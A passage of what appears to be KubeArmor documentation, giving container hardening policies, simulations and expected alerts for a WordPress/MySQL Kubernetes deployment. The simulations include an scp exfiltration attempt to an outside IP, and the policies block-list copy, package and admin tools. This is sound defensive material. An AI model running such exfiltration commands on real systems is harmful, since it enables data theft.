In a possible attack scenario, an attacker may try to update the configuration to disable security controls or access logs. This can allow them to gain further access to the system and carry out malicious activities undetected. It's crucial to be aware of such threats and take proactive measures to prevent such attacks from occurring.\
**Attack Type** Data Manipulation, Integrity Threats\
**Actual Attack** NetWalker, Conti, DarkSide RaaS

#### Compliance

* CIS Distribution Independent Linuxv2.0, Control-Id:6.3.5
* PCI-DSS, Requirement: 6
* PCI-DSS, Requirement: 10
* NIST\_800-53\_AU-2
* MITRE\_T1565\_data\_manipulation

### Policy

#### File Integrity Monitoring

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-file-integrity-monitoring
  namespace: wordpress-mysql
spec:
  action: Block
  file:
    matchDirectories:
    - dir: /sbin/
      readOnly: true
      recursive: true
    - dir: /usr/bin/
      readOnly: true
      recursive: true
    - dir: /usr/lib/
      readOnly: true
      recursive: true
    - dir: /usr/sbin/
      readOnly: true
      recursive: true
    - dir: /bin/
      readOnly: true
      recursive: true
    - dir: /boot/
      readOnly: true
      recursive: true
  message: Detected and prevented compromise to File integrity
  selector:
    matchLabels:
      app: mysql
  severity: 1
  tags:
  - NIST
  - NIST_800-53_AU-2
  - NIST_800-53_SI-4
  - MITRE
  - MITRE_T1036_masquerading
  - MITRE_T1565_data_manipulation
```

**Simulation**

```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd sbin
root@mysql-74775b4bf4-65nqf:/sbin# touch file
touch: cannot touch 'file': Permission denied
root@mysql-74775b4bf4-65nqf:/sbin# cd ..
```

#### Expected Alert

```
{
  "ATags": [
    "NIST",
    "NIST_800-53_AU-2",
    "NIST_800-53_SI-4",
    "MITRE",
    "MITRE_T1036_masquerading",
    "MITRE_T1565_data_manipulation"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_NOCTTY|O_NONBLOCK",
  "Enforcer": "AppArmor",
  "HashID": "f0b220bfa3b7aeae754f3bf8a60dd1a0af001f5956ad22f625bdf83406a7fea3",
  "HostName": "aditya",
  "HostPID": 16462,
  "HostPPID": 16435,
  "Labels": "app=mysql",
  "Message": "Detected and prevented compromise to File integrity",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 167,
  "PPID": 160,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-file-integrity-monitoring",
  "ProcessName": "/bin/touch",
  "Resource": "/sbin/file",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/usr/bin/touch file",
  "Tags": "NIST,NIST_800-53_AU-2,NIST_800-53_SI-4,MITRE,MITRE_T1036_masquerading,MITRE_T1565_data_manipulation",
  "Timestamp": 1696316210,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T06:56:50.829165Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

### References

[Mitre-Techniques-T1565](https://attack.mitre.org/techniques/T1565/)\
[PCI DSS and FIM](https://pcidssguide.com/the-pci-dss-and-file-integrity-monitoring/)\
[The biggest ransomware attacks in history](https://www.techtarget.com/searchsecurity/tip/The-biggest-ransomware-attacks-in-history)<br>

</details>

<details>

<summary>Packaging tools: Deny execution of package management tools</summary>

#### Description

Pods/Containers might get shipped with binaries which should never used in the production environments. Some of those bins might be useful in dev/staging environments but the same container image is carried forward in most cases to the production environment too. For security reasons, the devsecops team might want to disable the use of these binaries in the production environment even though the bins exists in the container. As an example, most of the container images are shipped with package management tools such as apk, apt, yum, etc. If anyone ends up using these bins in the prod env, it will increase the attack surface of the container/pod.

#### Attack Scenario

In an attack scenario, adversaries may use system tools such as fsck, ip, who, apt, and others for reconnaissance and to download additional tooling from remote servers. These tools can help them gain valuable information about the system and its vulnerabilities, allowing them to carry out further attacks. It's important to be vigilant about such activities and implement security measures to prevent such attacks from happening.\
**Attack Type** Command Injection, Malware, Backdoor\
**Actual Attack** AppleJeus, Codecov supply chain

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id:6.4.5
* NIST\_800-53\_SI-4
* NIST\_800-53\_CM-7(4)

### Policy

#### Packaging tools execution

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-pkg-mngr-exec
  namespace: wordpress-mysql
spec:
  action: Block
  message: Alert! Execution of package management process inside container is denied
  process:
    matchPaths:
    - path: /usr/bin/apt
    - path: /usr/bin/apt-get
    - path: /bin/apt-get
    - path: /sbin/apk
    - path: /bin/apt
    - path: /usr/bin/dpkg
    - path: /bin/dpkg
    - path: /usr/bin/gdebi
    - path: /bin/gdebi
    - path: /usr/bin/make
    - path: /bin/make
    - path: /usr/bin/yum
    - path: /bin/yum
    - path: /usr/bin/rpm
    - path: /bin/rpm
    - path: /usr/bin/dnf
    - path: /bin/dnf
    - path: /usr/bin/pacman
    - path: /usr/sbin/pacman
    - path: /bin/pacman
    - path: /sbin/pacman
    - path: /usr/bin/makepkg
    - path: /usr/sbin/makepkg
    - path: /bin/makepkg
    - path: /sbin/makepkg
    - path: /usr/bin/yaourt
    - path: /usr/sbin/yaourt
    - path: /bin/yaourt
    - path: /sbin/yaourt
    - path: /usr/bin/zypper
    - path: /bin/zypper
  selector:
    matchLabels:
      app: mysql
  severity: 5
  tags:
  - NIST
  - NIST_800-53_CM-7(4)
  - SI-4
  - process
  - NIST_800-53_SI-4
```

**Simulation**

```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# apt
bash: /usr/bin/apt: Permission denied
root@mysql-74775b4bf4-65nqf:/# apt-get
bash: /usr/bin/apt-get: Permission denied
```

**Expected Alert**

```
{
  "ATags": [
    "NIST",
    "NIST_800-53_CM-7(4)",
    "SI-4",
    "process",
    "NIST_800-53_SI-4"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HashID": "dd573c234f68b8df005e8cd314809c8b2a23852230d397743e348bf4a03ada3f",
  "HostName": "aditya",
  "HostPID": 21894,
  "HostPPID": 16435,
  "Labels": "app=mysql",
  "Message": "Alert! Execution of package management process inside container is denied",
  "NamespaceName": "wordpress-mysql",
  "Operation": "Process",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 168,
  "PPID": 160,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-pkg-mngr-exec",
  "ProcessName": "/usr/bin/apt",
  "Resource": "/usr/bin/apt",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "NIST,NIST_800-53_CM-7(4),SI-4,process,NIST_800-53_SI-4",
  "Timestamp": 1696318864,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T07:41:04.096412Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

### References

[MITRE Installer Packages](https://attack.mitre.org/techniques/T1546/016/)\
[Codecov Incident - A Supply Chain Attack](https://blog.sonatype.com/what-you-need-to-know-about-the-codecov-incident-a-supply-chain-attack-gone-undetected-for-2-months)<br>

</details>

<details>

<summary>Trusted certs bundle: Protect write access to the trusted root certificates bundle</summary>

#### Description

Adversaries may install a root certificate on a compromised system to avoid warnings when connecting to adversary-controlled web servers. Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. Installation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system.

#### Attack Scenario

By using this technique, attackers can successfully evade security warnings that alert users when compromised systems connect over HTTPS to adversary-controlled web servers. These servers often look like legitimate websites, and are designed to trick users into entering their login credentials, which can then be used by the attackers. It's important to be aware of this threat and take necessary precautions to prevent these attacks from happening.\
**Attack Type** Man-In-The-Middle(MITM)\
**Actual Attack** POODLE(Padding Oracle On Downgraded Legacy Encryption), BEAST (Browser Exploit Against SSL/TLS)

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 6.3.4
* MITRE\_T1552\_unsecured\_credentials

### Policy

#### Trusted Certs Bundle

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-mysql-trusted-cert-mod
  namespace: wordpress-mysql
spec:
  action: Block
  file:
    matchDirectories:
    - dir: /etc/ssl/
      readOnly: true
      recursive: true
    - dir: /etc/pki/
      readOnly: true
      recursive: true
    - dir: /usr/local/share/ca-certificates/
      readOnly: true
      recursive: true
  message: Credentials modification denied
  selector:
    matchLabels:
      app: mysql
  severity: 1
  tags:
  - MITRE
  - MITRE_T1552_unsecured_credentials
  - FGT1555
  - FIGHT
```

**Simulation**

```sh
 kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd /etc/ssl/
root@mysql-74775b4bf4-65nqf:/etc/ssl# ls
certs
root@mysql-74775b4bf4-65nqf:/etc/ssl# rmdir certs
rmdir: failed to remove 'certs': Permission denied
root@mysql-74775b4bf4-65nqf:/etc/ssl# cd certs/
root@mysql-74775b4bf4-65nqf:/etc/ssl/certs# touch new
touch: cannot touch 'new': Permission denied
root@mysql-74775b4bf4-65nqf:/etc/ssl/certs#
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_RMDIR",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 24462,
  "HostPPID": 24411,
  "Labels": "app=mysql",
  "Message": "Credentials modification denied",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 185,
  "PPID": 179,
  "ParentProcessName": "/bin/bash",
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "harden-mysql-trusted-cert-mod",
  "ProcessName": "/bin/rmdir",
  "Resource": "/etc/ssl/certs",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/rmdir certs",
  "Tags": "MITRE,MITRE_T1552_unsecured_credentials,FGT1555,FIGHT",
  "Timestamp": 1696320102,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-03T08:01:42.373810Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[MITRE Subvert Trust Controls](https://attack.mitre.org/techniques/T1553/004/)\
[MITRE Unsecured credentials](https://attack.mitre.org/techniques/T1552/)\
[POODLE Attack](https://www.acunetix.com/blog/web-security-zone/what-is-poodle-attack/)\
[BEAST](https://docs.digicert.com/en/certcentral/certificate-tools/discovery-user-guide/tls-ssl-endpoint-vulnerabilities/beast.html).)<br>

</details>

<details>

<summary>Database access: Protect read/write access to raw database tables from unknown processes.</summary>

#### Description

Applications use databases to store all the information such as posts, blogs, user information, etc. WordPress applications almost certainly use a MySQL database for storing their content, and those are usually stored elsewhere on the system, often /var/lib/mysql/some\_db\_name.

#### Attack Scenario

Adversaries have been known to use various techniques to steal information from databases. This information can include user credentials, posts, blogs, and more. By obtaining this information, adversaries can gain access to user accounts and potentially perform a full-account takeover, which can lead to further compromise of the target system. It's important to ensure that appropriate security measures are in place to protect against these types of attacks.\
**Attack Type** SQL Injection, Credential Access, Account Takeover\
**Actual Attack** Yahoo Voices Data Breach in 2012

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 6.14.4

### Policy

#### Database Access

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-mysql-dir
  namespace: wordpress-mysql
spec:
  message: Alert! Attempt to make changes to database detected
  tags:
  - CIS
  - CIS_Linux
  selector:
    matchLabels:
      app: mysql
  file:
    matchDirectories:
    - dir: /var/lib/mysql/
      ownerOnly: true
      readOnly: true
      severity: 1
      action: Block
```

**Simulation**

```sh
kubectl exec -it mysql-74775b4bf4-65nqf -n wordpress-mysql -- bash
root@mysql-74775b4bf4-65nqf:/# cd var/lib/mysql
root@mysql-74775b4bf4-65nqf:/var/lib/mysql# cat ib_logfile1
cat: ib_logfile1: Permission denied
root@mysql-74775b4bf4-65nqf:/var/lib/mysql#
```

**Expected Alert**

```
{
  "ATags": [
    "CIS",
    "CIS_Linux"
  ],
  "Action": "Block",
  "ClusterName": "aditya",
  "ContainerID": "b75628d4225b8071d5795da342cf2a5c03b1d67b22b40016697fcd17a0db20e4",
  "ContainerImage": "docker.io/library/mysql:5.6@sha256:20575ecebe6216036d25dab5903808211f1e9ba63dc7825ac20cb975e34cfcae",
  "ContainerName": "mysql",
  "Data": "syscall=SYS_OPEN flags=O_RDONLY",
  "Enforcer": "AppArmor",
  "HashID": "a7b7d91d52de395fe6cda698e89e0112e6f3ab818ea331cee60295a8ede358c8",
  "HostName": "aditya",
  "HostPID": 29898,
  "HostPPID": 29752,
  "Labels": "app=mysql",
  "Message": "Alert! Attempt to make changes to database detected",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "mysql",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 230,
  "PPID": 223,
  "PodName": "mysql-74775b4bf4-65nqf",
  "PolicyName": "ksp-block-mysql-dir",
  "ProcessName": "/bin/cat",
  "Resource": "/var/lib/mysql/ib_logfile1",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/cat ib_logfile1",
  "Tags": "CIS,CIS_Linux",
  "Timestamp": 1696322555,
  "Type": "MatchedPolicy",
  "UID": 0,
  "UpdatedTime": "2023-10-03T08:42:35.618890Z",
  "cluster_id": "3896",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "workload": "1"
}
```

### References

[MITRE Scan Databases](https://attack.mitre.org/techniques/T1596/005/)\
[Yahoo Service Hacked](https://arstechnica.com/information-technology/2012/07/yahoo-service-hacked/)<br>

</details>

<details>

<summary>Config data: Protect access to configuration data containing plain text credentials.</summary>

#### Description

Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.

#### Attack Scenario

In a possible attack scenario, an attacker may try to change the configurations to open websites to application security holes such as session hijacking and cross-site scripting attacks, which can lead to the disclosure of private data. Additionally, attackers can also leverage these changes to gather sensitive information. It's crucial to take proactive measures to prevent these attacks from occurring.\
**Attack Type** Cross-Site Scripting(XSS), Data manipulation, Session hijacking\
**Actual Attack** XSS attack on Fortnite 2019, Turla LightNeuron Attack

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 6.16.14

### Policy

#### Config data

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-stig-v-81883-restrict-access-to-config-files
  namespace: wordpress-mysql
spec:
  tags:
  - config-files
  message: Alert! configuration files have been accessed
  selector:
    matchLabels:
      app: wordpress
  file:
    matchPatterns:
    - pattern: /**/*.conf
      ownerOnly: true
  action: Block
```

**Simulation**

With a shell different than the user owning the file:

```sh
$ cat /etc/ca-certificates.conf                                                                                         
cat: /etc/ca-certificates.conf: Permission denied                                                                       
$                                                   
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPEN flags=O_RDONLY",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 39039,
  "HostPPID": 38787,
  "Labels": "app=wordpress",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 220,
  "PPID": 219,
  "ParentProcessName": "/bin/dash",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/bin/cat",
  "Resource": "/etc/ca-certificates.conf",
  "Result": "Permission denied",
  "Source": "/bin/cat /etc/ca-certificates.conf",
  "Timestamp": 1696485467,
  "Type": "MatchedPolicy",
  "UID": 1000,
  "UpdatedTime": "2023-10-05T05:57:47.935622Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[MITRE Unsecured credentials in files](https://attack.mitre.org/techniques/T1552/001/)\
[Turla LightNeuron](https://www.welivesecurity.com/2019/05/07/turla-lightneuron-email-too-far/)<br>

</details>

<details>

<summary>File Copy: Prevent file copy using standard utilities.</summary>

#### Description

Exfiltration consists of techniques that adversaries may use to steal data from your network. Once they’ve collected data, adversaries often package it to avoid detection while removing it. This can include compression and encryption. Techniques for getting data out of a target network typically include transferring it over their command and control channel or an alternate channel and may also include putting size limits on the transmission.

#### Attack Scenario

It's important to note that file copy tools can be leveraged by attackers for exfiltrating sensitive data and transferring malicious payloads into the workloads. Additionally, it can also assist in lateral movement within the system. It's crucial to take proactive measures to prevent these attacks from occurring.\
**Attack Type** Credential Access, Lateral movements, Information Disclosure\
**Actual Attack** DarkBeam Data Breach, Shields Health Care Group data breach

#### Compliance

* MITRE\_TA0010\_exfiltration
* NIST\_800-53\_SI-4(18)
* MITRE\_TA0008\_lateral\_movement

### Policy

#### File Copy

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-wordpress-remote-file-copy
  namespace: wordpress-mysql
spec:
  action: Block
  message: Alert! remote file copy tools execution prevented.
  process:
    matchPaths:
    - path: /usr/bin/rsync
    - path: /bin/rsync
    - path: /usr/bin/scp
    - path: /bin/scp
    - path: /usr/bin/scp
    - path: /bin/scp
  selector:
    matchLabels:
      app: wordpress
  severity: 5
  tags:
  - MITRE
  - MITRE_TA0008_lateral_movement
  - MITRE_TA0010_exfiltration
  - MITRE_TA0006_credential_access
  - MITRE_T1552_unsecured_credentials
  - NIST_800-53_SI-4(18)
  - NIST
  - NIST_800-53
  - NIST_800-53_SC-4
```

**Simulation**

```sh
root@wordpress-fb448db97-wj7n7:/usr/bin# scp /etc/ca-certificates.conf 104.192.3.74:/mine/                              
bash: /usr/bin/scp: Permission denied                                                                                   
root@wordpress-fb448db97-wj7n7:/usr/bin#     
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_EXECVE",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 72178,
  "HostPPID": 30490,
  "Labels": "app=wordpress",
  "Message": "Alert! remote file copy tools execution prevented.",
  "NamespaceName": "wordpress-mysql",
  "Operation": "Process",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 259,
  "PPID": 193,
  "ParentProcessName": "/bin/bash",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "harden-wordpress-remote-file-copy",
  "ProcessName": "/usr/bin/scp",
  "Resource": "/usr/bin/scp /etc/ca-certificates.conf 104.192.3.74:/mine/",
  "Result": "Permission denied",
  "Severity": "5",
  "Source": "/bin/bash",
  "Tags": "MITRE,MITRE_TA0008_lateral_movement,MITRE_TA0010_exfiltration,MITRE_TA0006_credential_access,MITRE_T1552_unsecured_credentials,NIST_800-53_SI-4(18),NIST,NIST_800-53,NIST_800-53_SC-4",
  "Timestamp": 1696487496,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T06:31:36.085860Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[MITRE Exfiltration](https://attack.mitre.org/tactics/TA0010/)\
[Darkbeams data breach](https://www.idstrong.com/sentinel/darkbeams-alarming-data-breach/)\
[Shields Healthcare Group Data Breach](https://www.idstrong.com/sentinel/shields-healthcare-group-data-breach/)<br>

</details>

<details>

<summary>Network Access: Process based network access control</summary>

#### Description

Typically, within a pod/container, there are only specific processes that need to use network access. KubeArmor allows one to specify the set of binaries that are allowed to use network primitives such as TCP, UDP, and Raw sockets and deny everyone else.

#### Attack Scenario

In a possible attack scenario, an attacker binary may attempt to send a beacon to its Command and Control (C\&C) Server. Additionally, the binary may use network primitives to exfiltrate pod/container data and configuration. It's important to monitor network traffic and take proactive measures to prevent these attacks from occurring, such as implementing proper access controls and segmenting the network.\
**Attack Type** Denial of Service(DoS), Distributed Denial of Service(DDoS)\
**Actual Attack** DDoS attacks on websites of public institutions in Belgium, DDoS attack on the website of a city government in Germany

#### Compliance

* Network Access

### Policy

#### Network Access

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: restrict-proccess
  namespace: default
spec:
  severity: 4
  selector:
    matchLabels:
      app: nginx
  network:
    matchProtocols:
    - protocol: tcp
      fromSource:
      - path: /usr/bin/wget
    - protocol: udp
      fromSource:
      - path: /usr/bin/wget
  action:
    Allow
```

**Simulation**

Set the default security posture to default-deny

```sh
kubectl annotate ns default kubearmor-network-posture=block --overwrite
```

```sh
kubectl exec -it nginx-77b4fdf86c-x7sdm -- bash
root@nginx-77b4fdf86c-x7sdm:/# curl www.google.com
curl: (6) Could not resolve host: www.google.com
root@nginx-77b4fdf86c-x7sdm:/# wget https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml
--2023-10-06 11:08:58--  https://github.com/kubearmor/KubeArmor/blob/main/examples/wordpress-mysql/original/wordpress-mysql-deployment.yaml
Resolving github.com (github.com)... 20.207.73.82
Connecting to github.com (github.com)|20.207.73.82|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15051 (15K) [text/plain]
Saving to: 'wordpress-mysql-deployment.yaml.2'

wordpress-mysql-deployment.ya 100%[=================================================>]  14.70K  --.-KB/s    in 0.08s

2023-10-06 11:08:59 (178 KB/s) - 'wordpress-mysql-deployment.yaml.2' saved [15051/15051]
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "0-trust",
  "ContainerID": "20a6333c6a46e0da32b3062f0ba76e9aed4fc5ef51f5ee8aec5b980963cedea3",
  "ContainerImage": "docker.io/library/nginx:latest@sha256:32da30332506740a2f7c34d5dc70467b7f14ec67d912703568daff790ab3f755",
  "ContainerName": "nginx",
  "Data": "syscall=SYS_SOCKET",
  "Enforcer": "AppArmor",
  "HostName": "aditya",
  "HostPID": 73952,
  "HostPPID": 73945,
  "Labels": "app=nginx",
  "NamespaceName": "default",
  "Operation": "Network",
  "Owner": {
    "Name": "nginx",
    "Namespace": "default",
    "Ref": "Deployment"
  },
  "PID": 532,
  "PPID": 525,
  "ParentProcessName": "/usr/bin/bash",
  "PodName": "nginx-77b4fdf86c-x7sdm",
  "PolicyName": "DefaultPosture",
  "ProcessName": "/usr/bin/curl",
  "Resource": "domain=AF_INET type=SOCK_DGRAM|SOCK_NONBLOCK|SOCK_CLOEXEC protocol=0",
  "Result": "Permission denied",
  "Source": "/usr/bin/curl www.google.com",
  "Timestamp": 1696588301,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-06T10:31:41.935146Z",
  "cluster_id": "4291",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

</details>

<details>

<summary>/tmp/ noexec: Do not allow execution of binaries from /tmp/ folder.</summary>

#### Description

If provided the necessary privileges, users have the ability to install software in organizational information systems. To maintain control over the types of software installed, organizations identify permitted and prohibited actions regarding software installation. Prohibited software installations may include, for example, software with unknown or suspect pedigrees or software that organizations consider potentially malicious.

#### Attack Scenario

In an attack scenario, a hacker may attempt to inject malicious scripts into the /tmp folder through a web application exploit. Once the script is uploaded, the attacker may try to execute it on the server in order to take it down. By hardening the /tmp folder, the attacker will not be able to execute the script, preventing such attacks. It's essential to implement these security measures to protect against these types of attacks and ensure the safety of the system.\
**Attack Type** System Failure, System Breach\
**Actual Attack** Shields Health Care Group data breach, MOVEit Breach

#### Compliance

* CIS Distribution Independent Linuxv2.0
* Control-Id: 1.1.5
* Control-Id: 1.1.10

### Policy

#### /tmp/ noexec

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: ksp-block-exec-inside-tmp
  namespace: wordpress-mysql
spec:
  tags:
  - CIS
  - CIS-control-1.1.5
  message: Alert! Execution attempted inside tmp folder
  selector:
    matchLabels:
      app: wordpress
  process:
    matchDirectories:
    - dir: /tmp/
      recursive: true
  action: Block
```

**Simulation**

```sh
root@wordpress-fb448db97-wj7n7:/var/tmp# ls /var/tmp                                                                    xvzf                                                                                                                    
root@wordpress-fb448db97-wj7n7:/var/tmp# /var/tmp/xvzf                                                                  
bash: /var/tmp/xvzf: Permission denied                                                                                  
root@wordpress-fb448db97-wj7n7:/var/tmp#  
```

**Expected Alert**

```
{
  "Action": "Block",
  "ClusterName": "d3mo",
  "ContainerID": "548176888fca6bb6d66633794f3d5f9d54930a9d9f43d4f05c11de821c758c0f",
  "ContainerImage": "docker.io/library/wordpress:4.8-apache@sha256:6216f64ab88fc51d311e38c7f69ca3f9aaba621492b4f1fa93ddf63093768845",
  "ContainerName": "wordpress",
  "Data": "syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_EXCL|O_TRUNC",
  "Enforcer": "AppArmor",
  "HostName": "master-node",
  "HostPID": 30490,
  "HostPPID": 6119,
  "Labels": "app=wordpress",
  "Message": "Alert! Execution attempted inside /tmp",
  "NamespaceName": "wordpress-mysql",
  "Operation": "File",
  "Owner": {
    "Name": "wordpress",
    "Namespace": "wordpress-mysql",
    "Ref": "Deployment"
  },
  "PID": 193,
  "PPID": 6119,
  "ParentProcessName": "/var/lib/rancher/k3s/data/24a53467e274f21ca27cec302d5fbd58e7176daf0a47a2c9ce032ee877e0979a/bin/containerd-shim-runc-v2",
  "PodName": "wordpress-fb448db97-wj7n7",
  "PolicyName": "ksp-block-exec-inside-tmp",
  "ProcessName": "/bin/bash",
  "Resource": "/tmp/sh-thd-2512146865",
  "Result": "Permission denied",
  "Severity": "1",
  "Source": "/bin/bash",
  "Tags": "CIS,CIS_Linux",
  "Timestamp": 1696492433,
  "Type": "MatchedPolicy",
  "UpdatedTime": "2023-10-05T07:53:53.259403Z",
  "cluster_id": "2302",
  "component_name": "kubearmor",
  "instanceGroup": "0",
  "instanceID": "0",
  "tenant_id": "167",
  "workload": "1"
}
```

### References

[STIG no exec in /tmp](https://www.stigviewer.com/stig/red_hat_enterprise_linux_6/2016-12-16/finding/V-57569)\
[The biggest ransomeware attacks in history](https://www.techtarget.com/searchsecurity/tip/The-biggest-ransomware-attacks-in-history)\
[Shields Healthcare Group Data Breach](https://www.idstrong.com/sentinel/shields-healthcare-group-data-breach/)<br>

</details>

<details>

<summary>Admin tools: Do not allow execution of administrative/maintenance tools inside the pods.</summary>

#### Description

Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment.

#### Attack Scenario

It's important to note that attackers with permissions could potentially run 'kubectl exec' to execute malicious code and compromise resources within a cluster. It's crucial to monitor the activity within the cluster and take proactive measures to prevent these attacks from occurring.\
**Attack Type** Command Injection, Lateral Movements, etc.\
**Actual Attack** Target cyberattack, Supply Chain Attacks

#### Compliance

* NIST\_800-53\_AU-2
* MITRE\_T1609\_container\_administration\_command
* NIST\_800-53\_SI-4

### Policy

#### Admin tools

```yaml
apiVersion: security.kubearmor.com/v1
kind: KubeArmorPolicy
metadata:
  name: harden-dvwa-web-k8s-client-tool-exec
  namespace: default
spec:
  action: Block
  message: Alert! k8s client tool executed inside container.
  process:
    matchPaths:
    - path: /usr/local/bin/kubectl
    - path: /usr/bin/kubectl
    - path: /usr/local/bin/docker
    - path: /usr/bin/docker
    - path: /usr/local/bin/crictl
    - path: /usr/bin/crictl
  selector:
    matchLabels:
      app: dvwa-web
      tier: frontend
  severity: 5
  tags:
  - MITRE_T1609_container_administration_command
  - MITRE_TA0002_execution
